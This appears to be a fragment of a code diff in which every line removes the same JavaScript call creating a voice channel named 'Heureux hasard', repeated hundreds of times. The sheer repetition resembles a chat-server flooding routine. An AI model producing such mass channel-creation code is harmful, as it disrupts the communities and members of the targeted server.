-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
